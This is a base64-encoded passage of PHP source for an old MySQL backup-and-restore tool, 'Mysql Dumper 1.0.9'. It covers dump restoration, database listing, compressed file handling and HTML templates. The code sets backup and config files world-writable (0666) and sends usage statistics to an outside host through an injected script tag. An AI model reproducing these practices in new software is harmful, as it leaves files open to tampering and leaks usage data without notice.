JfZXJyb3IgKCLQndC10YPQtNCw0LXRgtGB0Y8g0LjQt9C80LXQvdC40YLRjCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8uPEJSPnskc3FsfTxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCLQo9GB0YLQsNC90L7QstC70LXQvdCwINC60L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyBgIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiYC4iLCBDX1dBUk5JTkcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRoaXMtPnJlc3RvcmVfY2hhcnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRsYXN0X3Nob3dlZCAhPSAkdGFibGUpIHskY2FjaGUgLj0gdHBsX2woItCi0LDQsdC70LjRhtCwIGB7JHRhYmxlfWAuIik7ICRsYXN0X3Nob3dlZCA9ICR0YWJsZTt9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJHRoaXMtPm15c3FsX3ZlcnNpb24gPiA0MDEwMSAmJiBlbXB0eSgkbGFzdF9jaGFyc2V0KSkgeyAvLyDQo9GB0YLQsNC90LDQstC70LjQstCw0LXQvCDQutC+0LTQuNGA0L7QstC60YMg0L3QsCDRgdC70YPRh9Cw0Lkg0LXRgdC70Lgg0L7RgtGB0YPRgtGB0YLQstGD0LXRgiBDUkVBVEUgVEFCTEUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoIlNFVCAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0ICciIC4gJHRoaXMtPnJlc3RvcmVfY2hhcnNldCAuICInIikgb3IgdHJpZ2dlcl9lcnJvciAoItCd0LXRg9C00LDQtdGC0YHRjyDQuNC30LzQtdC90LjRgtGMINC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjy48QlI+eyRzcWx9PEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQo9GB0YLQsNC90L7QstC70LXQvdCwINC60L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyBgIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiYC4iLCBDX1dBUk5JTkcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRoaXMtPnJlc3RvcmVfY2hhcnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGluc2VydCA9ICcnOwogICAgICAgICAgICAgICAgICAgICRleGVjdXRlID0gMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkcXVlcnlfbGVuID49IDY1NTM2ICYmIHByZWdfbWF0Y2goIi8sJC8iLCAkc3RyKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkc3FsID0gcnRyaW0oJGluc2VydCAuICRzcWwsICIsIik7CiAgICAgICAgICAgICAgICAgICAgJGV4ZWN1dGUgPSAxOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGV4ZWN1dGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHErKzsKICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoJHNxbCkgb3IgdHJpZ2dlcl9lcnJvciAoIldyb25nIHF1ZXJyeS48QlI+IiAuIG15c3FsX2Vycm9yKCksIEVfVVNFUl9FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgiL15pbnNlcnQvaSIsICRzcWwpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYWZmX3Jvd3MgKz0gbXlzcWxfYWZmZWN0ZWRfcm93cygpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHF1ZXJ5X2xlbiA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICRleGVjdXRlID0gMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWNobyAkY2FjaGU7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDEgLCAxKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJEQiB3YXMgcmVzdG9yZWQgZnJvbSBiYWNrdXAuIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRpbmZvWzNdKSkgZWNobyB0cGxfbCgi0JTQsNGC0LAg0YHQvtC30LTQsNC90LjRjyDQutC+0L/QuNC4OiB7JGluZm9bM119IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgiREIgcXVlcmllczogeyRxfSIsIENfUkVTVUxUKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIlRhYmxlcyB3YXMgY3JlYXRlZDogeyR0YWJzfSIsIENfUkVTVUxUKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woItCh0YLRgNC+0Log0LTQvtCx0LDQstC70LXQvdC+OiB7JGFmZl9yb3dzfSIsIENfUkVTVUxUKTsKCiAgICAgICAgICAgICAgICAkdGhpcy0+dGFicyA9ICR0YWJzOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlY29yZHMgPSAkYWZmX3Jvd3M7CiAgICAgICAgICAgICAgICAkdGhpcy0+c2l6ZSA9IGZpbGVzaXplKFBBVEggLiAkdGhpcy0+ZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgJHRoaXMtPmNvbXAgPSAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddICogMTAgKyAkdGhpcy0+U0VUWydjb21wX2xldmVsJ107CiAgICAgICAgICAgICAgICBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYWNrJykuZGlzYWJsZWQgPSAwOzwvU0NSSVBUPiI7CiAgICAgICAgICAgICAgICAvLyDQn9C10YDQtdC00LDRh9CwINC00LDQvdC90YvRhSDQtNC70Y8g0LPQu9C+0LHQsNC70YzQvdC+0Lkg0YHRgtCw0YLQuNGB0YLQuNC60LgKICAgICAgICAgICAgICAgIGlmIChHUykgZWNobyAiPFNDUklQVD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnR1MnKS5zcmMgPSAnaHR0cDovL3N5cGV4Lm5ldC9ncy5waHA/cj17JHRoaXMtPnRhYnN9LHskdGhpcy0+cmVjb3Jkc30seyR0aGlzLT5zaXplfSx7JHRoaXMtPmNvbXB9LDEwOCc7PC9TQ1JJUFQ+IjsKCiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fY2xvc2UoJGZwKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIG1haW4oKXsKICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX2xldmVscyA9IGFycmF5KCc5JyA9PiAnOSAo0LzQsNC60YHQuNC80LDQu9GM0L3QsNGPKScsICc4JyA9PiAnOCcsICc3JyA9PiAnNycsICc2JyA9PiAnNicsICc1JyA9PiAnNSAo0YHRgNC10LTQvdGP0Y8pJywgJzQnID0+ICc0JywgJzMnID0+ICczJywgJzInID0+ICcyJywgJzEnID0+ICcxICjQvNC40L3QuNC80LDQu9GM0L3QsNGPKScsJzAnID0+ICfQkdC10Lcg0YHQttCw0YLQuNGPJyk7CgogICAgICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygiYnpvcGVuIikpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y29tcF9tZXRob2RzWzJdID0gJ0JaaXAyJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoImd6b3BlbiIpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNvbXBfbWV0aG9kc1sxXSA9ICdHWmlwJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX21ldGhvZHNbMF0gPSAn0JHQtdC3INGB0LbQsNGC0LjRjyc7CiAgICAgICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPmNvbXBfbWV0aG9kcykgPT0gMSkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX2xldmVscyA9IGFycmF5KCcwJyA9PifQkdC10Lcg0YHQttCw0YLQuNGPJyk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGRicyA9ICR0aGlzLT5kYl9zZWxlY3QoKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWydkYl9iYWNrdXAnXSAgICA9ICR0aGlzLT5mbl9zZWxlY3QoJGRicywgJHRoaXMtPlNFVFsnbGFzdF9kYl9iYWNrdXAnXSk7CiAgICAgICAgICAgICAgICAkdGhpcy0+dmFyc1snZGJfcmVzdG9yZSddICAgPSAkdGhpcy0+Zm5fc2VsZWN0KCRkYnMsICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWydjb21wX2xldmVscyddICA9ICR0aGlzLT5mbl9zZWxlY3QoJHRoaXMtPmNvbXBfbGV2ZWxzLCAkdGhpcy0+U0VUWydjb21wX2xldmVsJ10pOwogICAgICAgICAgICAgICAgJHRoaXMtPnZhcnNbJ2NvbXBfbWV0aG9kcyddID0gJHRoaXMtPmZuX3NlbGVjdCgkdGhpcy0+Y29tcF9tZXRob2RzLCAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWyd0YWJsZXMnXSAgICAgICA9ICR0aGlzLT5TRVRbJ3RhYmxlcyddOwogICAgICAgICAgICAgICAgJHRoaXMtPnZhcnNbJ2ZpbGVzJ10gICAgICAgID0gJHRoaXMtPmZuX3NlbGVjdCgkdGhpcy0+ZmlsZV9zZWxlY3QoKSwgJycpOwogICAgICAgICAgICAgICAgZ2xvYmFsICRkdW1wZXJfZmlsZTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxJTlBVVCBUWVBFPXN1Ym1pdCBWQUxVRT1BcHBseT48SU5QVVQgVFlQRT1idXR0b24gVkFMVUU9RXhpdCBvbkNsaWNrPVwibG9jYXRpb24uaHJlZiA9ICciLiRkdW1wZXJfZmlsZS4iP3JlbG9hZCdcIj4iOwogICAgICAgICAgICAgICAgZWNobyB0cGxfcGFnZSh0cGxfbWFpbigpLCAkYnV0dG9ucyk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBkYl9zZWxlY3QoKXsKICAgICAgICAgICAgICAgIGlmIChEQk5BTUVTICE9ICcnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtcyA9IGV4cGxvZGUoJywnLCB0cmltKERCTkFNRVMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkaXRlbXMgQVMgJGl0ZW0pewogICAgICAgICAgICAgICAgICAgICAgICBpZiAobXlzcWxfc2VsZWN0X2RiKCRpdGVtKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZXMgPSBteXNxbF9xdWVyeSgiU0hPVyBUQUJMRVMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmxlcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFicyA9IG15c3FsX251bV9yb3dzKCR0YWJsZXMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRic1skaXRlbV0gPSAieyRpdGVtfSAoeyR0YWJzfSkiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0hPVyBEQVRBQkFTRVMiKTsKICAgICAgICAgICAgICAgICRkYnMgPSBhcnJheSgpOwogICAgICAgICAgICAgICAgd2hpbGUoJGl0ZW0gPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChteXNxbF9zZWxlY3RfZGIoJGl0ZW1bMF0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYmxlcyA9IG15c3FsX3F1ZXJ5KCJTSE9XIFRBQkxFUyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGFibGVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJzID0gbXlzcWxfbnVtX3Jvd3MoJHRhYmxlcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGJzWyRpdGVtWzBdXSA9ICJ7JGl0ZW1bMF19ICh7JHRhYnN9KSI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkZGJzOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZmlsZV9zZWxlY3QoKXsKICAgICAgICAgICAgICAgICRmaWxlcyA9IGFycmF5KCcnID0+ICcgJyk7CiAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKFBBVEgpICYmICRoYW5kbGUgPSBvcGVuZGlyKFBBVEgpKSB7CiAgICAgICAgICAgIHdoaWxlIChmYWxzZSAhPT0gKCRmaWxlID0gcmVhZGRpcigkaGFuZGxlKSkpIHsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvXi4rP1wuc3FsKFwuKGd6fGJ6MikpPyQvIiwgJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGVzWyRmaWxlXSA9ICRmaWxlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNsb3NlZGlyKCRoYW5kbGUpOwogICAgICAgIH0KICAgICAgICBrc29ydCgkZmlsZXMpOwogICAgICAgICAgICAgICAgcmV0dXJuICRmaWxlczsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX29wZW4oJG5hbWUsICRtb2RlKXsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZpbGVuYW1lID0gInskbmFtZX0uc3FsLmJ6MiI7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJ6b3BlbihQQVRIIC4gJHRoaXMtPmZpbGVuYW1lLCAieyRtb2RlfWJ7JHRoaXMtPlNFVFsnY29tcF9sZXZlbCddfSIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZpbGVuYW1lID0gInskbmFtZX0uc3FsLmd6IjsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZ3pvcGVuKFBBVEggLiAkdGhpcy0+ZmlsZW5hbWUsICJ7JG1vZGV9YnskdGhpcy0+U0VUWydjb21wX2xldmVsJ119Iik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZW5hbWUgPSAieyRuYW1lfS5zcWwiOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZm9wZW4oUEFUSCAuICR0aGlzLT5maWxlbmFtZSwgInskbW9kZX1iIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl93cml0ZSgkZnAsICRzdHIpewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPT0gMikgewogICAgICAgICAgICAgICAgICAgIGJ6d3JpdGUoJGZwLCAkc3RyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgZ3p3cml0ZSgkZnAsICRzdHIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRmcCwgJHN0cik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9yZWFkKCRmcCl7CiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAyKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJ6cmVhZCgkZnAsIDQwOTYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDEpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZ3pyZWFkKCRmcCwgNDA5Nik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZnJlYWQoJGZwLCA0MDk2KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3JlYWRfc3RyKCRmcCl7CiAgICAgICAgICAgICAgICAkc3RyaW5nID0gJyc7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IGx0cmltKCR0aGlzLT5maWxlX2NhY2hlKTsKICAgICAgICAgICAgICAgICRwb3MgPSBzdHJwb3MoJHRoaXMtPmZpbGVfY2FjaGUsICJcbiIsIDApOwogICAgICAgICAgICAgICAgaWYgKCRwb3MgPCAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICghJHN0cmluZyAmJiAoJHN0ciA9ICR0aGlzLT5mbl9yZWFkKCRmcCkpKXsKICAgICAgICAgICAgICAgICAgICAgICAgJHBvcyA9IHN0cnBvcygkc3RyLCAiXG4iLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRwb3MgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSAuPSAkc3RyOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0cmluZyA9ICR0aGlzLT5maWxlX2NhY2hlIC4gc3Vic3RyKCRzdHIsIDAsICRwb3MgKyAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IHN1YnN0cigkc3RyLCAkcG9zICsgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkc3RyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmZpbGVfY2FjaGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSAkdGhpcy0+ZmlsZV9jYWNoZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5maWxlX2NhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cmltKCRzdHJpbmcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSBzdWJzdHIoJHRoaXMtPmZpbGVfY2FjaGUsIDAsICRwb3MpOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IHN1YnN0cigkdGhpcy0+ZmlsZV9jYWNoZSwgJHBvcyArIDEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIHRyaW0oJHN0cmluZyk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9jbG9zZSgkZnApewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPT0gMikgewogICAgICAgICAgICAgICAgICAgIGJ6Y2xvc2UoJGZwKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgZ3pjbG9zZSgkZnApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBAY2htb2QoUEFUSCAuICR0aGlzLT5maWxlbmFtZSwgMDY2Nik7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5faW5kZXgoKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3NlbGVjdCgkaXRlbXMsICRzZWxlY3RlZCl7CiAgICAgICAgICAgICAgICAkc2VsZWN0ID0gJyc7CiAgICAgICAgICAgICAgICBmb3JlYWNoKCRpdGVtcyBBUyAka2V5ID0+ICR2YWx1ZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZWxlY3QgLj0gJGtleSA9PSAkc2VsZWN0ZWQgPyAiPE9QVElPTiBWQUxVRT0neyRrZXl9JyBTRUxFQ1RFRD57JHZhbHVlfSIgOiAiPE9QVElPTiBWQUxVRT0neyRrZXl9Jz57JHZhbHVlfSI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gJHNlbGVjdDsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3NhdmUoKXsKICAgICAgICAgICAgICAgIGlmIChTQykgewogICAgICAgICAgICAgICAgICAgICAgICAkbmUgPSAhZmlsZV9leGlzdHMoUEFUSCAuICJkdW1wZXIuY2ZnLnBocCIpOwogICAgICAgICAgICAgICAgICAgICRmcCA9IGZvcGVuKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiLCAid2IiKTsKICAgICAgICAgICAgICAgIGZ3cml0ZSgkZnAsICI8P3BocFxuXCR0aGlzLT5TRVQgPSAiIC4gZm5fYXJyMnN0cigkdGhpcy0+U0VUKSAuICJcbj8+Iik7CiAgICAgICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRuZSkgQGNobW9kKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiLCAwNjY2KTsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZuX2luZGV4KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9pbmRleCgpewogICAgICAgICAgICAgICAgaWYgKCFmaWxlX2V4aXN0cyhQQVRIIC4gJ2luZGV4Lmh0bWwnKSkgewogICAgICAgICAgICAgICAgICAgICRmaCA9IGZvcGVuKFBBVEggLiAnaW5kZXguaHRtbCcsICd3YicpOwogICAgICAgICAgICAgICAgICAgICAgICBmd3JpdGUoJGZoLCB0cGxfYmFja3VwX2luZGV4KCkpOwogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJGZoKTsKICAgICAgICAgICAgICAgICAgICAgICAgQGNobW9kKFBBVEggLiAnaW5kZXguaHRtbCcsIDA2NjYpOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KfQoKZnVuY3Rpb24gZm5faW50KCRudW0pewogICAgICAgIHJldHVybiBudW1iZXJfZm9ybWF0KCRudW0sIDAsICcsJywgJyAnKTsKfQoKZnVuY3Rpb24gZm5fYXJyMnN0cigkYXJyYXkpIHsKICAgICAgICAkc3RyID0gImFycmF5KFxuIjsKICAgICAgICBmb3JlYWNoICgkYXJyYXkgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgICAgICAgICAgIGlmIChpc19hcnJheSgkdmFsdWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzdHIgLj0gIicka2V5JyA9PiAiIC4gZm5fYXJyMnN0cigkdmFsdWUpIC4gIixcblxuIjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkc3RyIC49ICInJGtleScgPT4gJyIgLiBzdHJfcmVwbGFjZSgiJyIsICJcJyIsICR2YWx1ZSkgLiAiJyxcbiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkc3RyIC4gIikiOwp9CgovLyBUZW1wbGF0ZXMKCmZ1bmN0aW9uIHRwbF9wYWdlKCRjb250ZW50ID0gJycsICRidXR0b25zID0gJycpewpyZXR1cm4gPDw8SFRNTAo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIj4KPEhUTUw+CjxIRUFEPgo8VElUTEU+TXlzcWwgRHVtcGVyIDEuMC45IHwgJmNvcHk7IDIwMDYgemFwaW1pcjwvVElUTEU+CjxNRVRBIEhUVFAtRVFVSVY9Q29udGVudC1UeXBlIENPTlRFTlQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCI+CjxTVFlMRSBUWVBFPSJURVhUL0NTUyI+CjwhLS0KYm9keXsKICAgICAgICBvdmVyZmxvdzogYXV0bzsKfQp0ZCB7CiAgICAgICAgZm9udDogMTFweCB0YWhvbWEsIHZlcmRhbmEsIGFyaWFsOwogICAgICAgIGN1cnNvcjogZGVmYXVsdDsKfQppbnB1dCwgc2VsZWN0LCBkaXYgewogICAgICAgIGZvbnQ6IDExcHggdGFob21hLCB2ZXJkYW5hLCBhcmlhbDsKfQppbnB1dC50ZXh0LCBzZWxlY3QgewogICAgICAgIHdpZHRoOiAxMDAlOwp9CmZpZWxkc2V0IHsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4Owp9Ci0tPgo8L1NUWUxFPgo8L0hFQUQ+Cgo8Qk9EWSBCR0NPTE9SPSNFQ0U5RDggVEVYVD0jMDAwMDAwPgo8VEFCTEUgV0lEVEg9MTAwJSBIRUlHSFQ9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTAgQUxJR049Q0VOVEVSPgo8VFI+CjxURCBIRUlHSFQ9NjAlIEFMSUdOPUNFTlRFUiBWQUxJR049TUlERExFPgo8VEFCTEUgV0lEVEg9MzYwIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9MD4KPFRSPgo8VEQgVkFMSUdOPVRPUCBTVFlMRT0iYm9yZGVyOiAxcHggc29saWQgIzkxOUI5QzsiPgo8VEFCTEUgV0lEVEg9MTAwJSBIRUlHSFQ9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0xIENFTExQQURESU5HPTA+CjxUUj4KPFREIElEPUhlYWRlciBIRUlHSFQ9MjAgQkdDT0xPUj0jN0E5NkRGIFNUWUxFPSJmb250LXNpemU6IDEzcHg7IGNvbG9yOiB3aGl0ZTsgZm9udC1mYW1pbHk6IHZlcmRhbmEsIGFyaWFsOwpwYWRkaW5nLWxlZnQ6IDVweDsgRklMVEVSOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuR3JhZGllbnQoZ3JhZGllbnRUeXBlPTEsc3RhcnRDb2xvclN0cj0jN0E5NkRGLGVuZENvbG9yU3RyPSNGQkZCRkQpIgp